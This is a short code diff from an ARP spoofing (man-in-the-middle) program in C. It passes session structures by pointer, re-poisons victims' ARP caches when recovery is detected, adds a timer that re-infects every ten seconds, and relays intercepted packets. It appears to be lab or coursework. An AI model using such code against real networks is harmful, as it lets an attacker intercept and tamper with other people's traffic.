@@ -63,7 +63,7 @@ int main(int argc, char* argv[])
 
 	// first infection
 	for(int i = 0; i < sess_cnt; i++) 
-		arp_infection(sess[i]);
+		arp_infection(&sess[i]);
 
 	// arp recovery detection & ip packet relay
 	while (true) 
@@ -84,7 +84,7 @@ int main(int argc, char* argv[])
 				   !memcmp(ethhdr->dst_mac, mac_ff, ADDR_LEN_MAC) &&
 				   !memcmp(arphdr->tar_ip, (uint8_t*)&sess[i].send_ip, ADDR_LEN_IP))  // if src_mac == s.tar_mac && broadcast && tar_ip == s.send_ip
 				{
-					arp_infection(sess[i]);
+					arp_infection(&sess[i]);
 				}
 			}
 		}
@@ -98,6 +98,16 @@ int main(int argc, char* argv[])
 					pkt_relay(recv_pkt, header->caplen, sess[i]);
 					break;
 				}
+			}
+		}
+
+		// infect every 10 seconds
+		time_t now = time(NULL);
+		for(int i = 0; i < sess_cnt; i++)
+		{
+			if(now - sess[i].last > 10)
+			{
+				arp_infection(&sess[i]);
 			}
 		}
 	
